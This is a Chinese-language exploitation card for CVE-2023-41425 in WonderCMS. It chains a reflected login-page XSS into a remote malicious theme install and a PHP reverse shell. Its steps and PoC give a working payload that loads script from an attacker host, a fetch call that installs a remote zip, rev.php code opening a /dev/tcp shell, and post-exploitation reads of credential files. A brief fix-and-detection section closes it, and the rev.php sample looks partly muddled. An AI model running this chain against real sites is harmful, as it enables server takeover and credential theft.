---
id: web-php-rce-wondercms-installmodule-theme-zip-csrf-xss
title: WonderCMS installModule 主题 zip 远程安装：登录页 XSS 借管理员会话拉取恶意主题落 WebShell
type: scenario
domain: web
path: web/php/rce
technique: wondercms-installmodule-theme-zip-rce
aliases:
- CVE-2023-41425
- WonderCMS
- installModule
- 主题 zip 安装 getshell
- loginURL XSS
tags:
- php
- cms
- xss
- csrf
- file-upload
- rce
- cve
cve:
- CVE-2023-41425
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: 原文按 WonderCMS 3.x 系列演示，未标注具体版本号/修复版本
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:18:02+08:00'
  notes: 已对照原文核对：WonderCMS 指纹 README.MD、CVE-2023-41425 的 index.php?page=loginURL XSS payload、exp.py 首次未成功、改 xss.js 后成功（xss.js 内 installModule 指向远程 revshell 主题 zip &directoryName=violet&type=themes&token=，随后访问 /themes/revshell-main/rev.php?lhost&lport 反弹）、拿到 www-data shell，均与原文及截图一致。已修正：按原文写明 installModule 拉取源为远程主题 zip（可替换为自建包）、rev.php 落在 themes/<directoryName> 下；删除此前非版本区间的 affected_versions（原文未标版本号）；[[web-generic-xss]] 为分类目录而非卡片，已改为指向实际卡片。原文未标注受影响版本区间，PoC 基于靶机未复跑
---

## 一句话结论

WonderCMS 的 `index.php?page=loginURL` 把 `page` 参数原样回显进页面，构造 `loginURL"></form><script src=...></script><form action="` 即可在管理员浏览时执行任意 JS；脚本再利用后台 `installModule` 把攻击者服务器上的主题 zip（`type=themes`）远程安装到 `themes/` 目录，zip 内自带 `rev.php` 反弹马，安装完成后直接访问该文件即获得 www-data shell。

## 原理

- **回显型 XSS（入口）**：`page` 参数未经 HTML 实体编码就落进表单属性/文本，闭合表单标签后注入 `<script src>`；因为 WonderCMS 登录页通常只有管理员会访问（也常被管理员用于“预览页面”），XSS 在这里等价于“拿到管理员浏览器”。
- **后台 installModule 的远程拉取（提权路径）**：后台模块安装接口接受 `installModule=<远程 zip URL>&directoryName=<目录名>&type=themes&token=<CSRF token>`，服务端 `file_get_contents`/`copy` 下载 zip 后解压到 `themes/<directoryName>`；代码只校验 CSRF token 与登录态，不校验 zip 内容与主题结构。
- **为什么 token 挡不住**：`token` 会出现在管理员自己的页面/JS 可见范围内（或攻击者脚本同源请求时被自动带上 session cookie），XSS 在管理员会话里执行，可直接读取或复用 token，从而通过 CSRF 校验。
- **为什么能落 webshell**：解压目标目录在 Web 根下且不限制扩展名；zip 里放 `rev.php`（读 `GET lhost/lport` 发起 `fsockopen` 反弹）即可执行任意代码，无需上传接口。
- **与“直接文件上传”的区别**：不是上传本地文件，而是让服务器主动从攻击者 URL 拉包，绕过前端的类型白名单；只要服务端出网就能打，配合 SSRF 也可以在不出网环境里用内网可访问地址喂包。

## 触发条件

- WonderCMS 处于受影响范围，后台模块安装功能可用（默认存在）。
- 管理员会访问攻击者构造的 `page=loginURL` 链接（钓鱼/评论/站内跳转），或攻击者已有低权限但能诱发管理员打开该 URL。
- 目标服务器能访问攻击者的 zip URL（或能被引到内网可控地址）。
- 主题目录可写；`themes/` 下的文件可直接通过 HTTP 访问执行。

## 利用步骤

1. 探测 WonderCMS：`README.MD`、`/index.php?page=loginURL` 特征、`themes/` 目录可枚举。
2. 构造 XSS 载荷闭合表单并加载远程 `xss.js`：`/index.php?page=loginURL"></form><script src="http://ATTACKER:8000/xss.js"></script><form action="`。
3. `xss.js` 里以管理员身份 `fetch` 后台安装接口：`/index.php?installModule=http://ATTACKER:8000/main.zip&directoryName=violet&type=themes&token=<从页面取>`（原文实测直接用 GitHub 上的公开 revshell 主题包 URL，自己投递时换成自建 zip 地址）。
4. zip 内放 `rev.php`（`<?php $sock=fsockopen($_GET['lhost'],$_GET['lport']); ... ?>`）+ 一个合法 `index.php` 以让主题结构看起来正常；原文用的就是现成 revshell 主题包里的 `rev.php`。
5. 安装成功后访问 `/themes/<directoryName>/rev.php?lhost=ATTACKER&lport=4444` 获得 shell（原文包名 revshell-main，故路径是 `/themes/revshell-main/rev.php`）；`python3 -c 'pty.spawn("/bin/bash")'` 升级为交互式 TTY。
6. 内网信息收集：读 `data/database.js`（WonderCMS 用 JSON 文件存配置与口令哈希）、`/etc/passwd`、`netstat -tnlp`，找本地只监听 127.0.0.1 的服务。

## PoC

```text
# 1) 触发管理员执行（钓鱼链接）
http://target/index.php?page=loginURL"></form><script src="http://ATTACKER:8000/xss.js"></script><form action="

# 2) xss.js 中借用管理员会话安装恶意主题（token 从当前页面读取）
fetch('/index.php?installModule=http://ATTACKER:8000/main.zip&directoryName=violet&type=themes&token=' + token)

# 3) zip 内的 rev.php
<?php
$sock = fsockopen($_GET['lhost'], (int)$_GET['lport']);
$bash = proc_open('/bin/bash', [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']], $pipes);
fwrite($pipes[0], "bash -i >& /dev/tcp/{$_GET['lhost']}/{$_GET['lport']} 0>&1\n");
?>

# 4) 拿 shell
curl 'http://target/themes/violet/rev.php?lhost=ATTACKER&lport=4444'
```

## 变体与关联

- 变体：`type=themes` 换成 `type=plugins`、`type=modules`，落点变为 `plugins/`、`modules/`，同样可直接访问执行。
- 变体：管理员不点链接时，可用站内评论/留言板/文章内容等存储型 XSS 面把同一段 JS 持久化，等管理员进后台触发。
- 变体：目标不出网时，把 `installModule` 指向内网已有的可控 zip（如自己先落地的静态文件），形成二次利用。
- 关联：[[web-php-rce-cmseasy-cve-2021-42643-template-save-file-write]]（后台模板写文件类）、[[web-generic-xss-path-segment-reflected-svg]]（同类「低门槛回显点 + 借管理员会话」的 XSS 入口，通用 XSS 手法见 web/generic/xss 目录）、后续提权见同批次的“日志分析 log_file 命令注入”卡。

## 检测与防御

- 修复：升级 WonderCMS 到修复版本（官方针对该 XSS 做了输出编码）；不能升级时对 `page` 参数做 HTML 实体编码/白名单。
- 加固：后台模块安装改为仅允许本地已上传的包 + 校验签名/白名单目录；禁止 `installModule` 接受外部 URL；`themes/`、`plugins/` 目录禁止 PHP 执行（Web 服务器层配置）。
- 检测：访问日志中 `page=loginURL` 后紧跟 `"></form><script`、`installModule=http`、`type=themes|plugins` 组合；`themes/` 目录短时间内出现新目录且内含 `.php`；管理员会话在异常 User-Agent/Referer 下调用安装接口。
- 响应：删除恶意主题目录、轮换管理员口令与会话、检查 `data/database.js` 是否被写入后门配置。
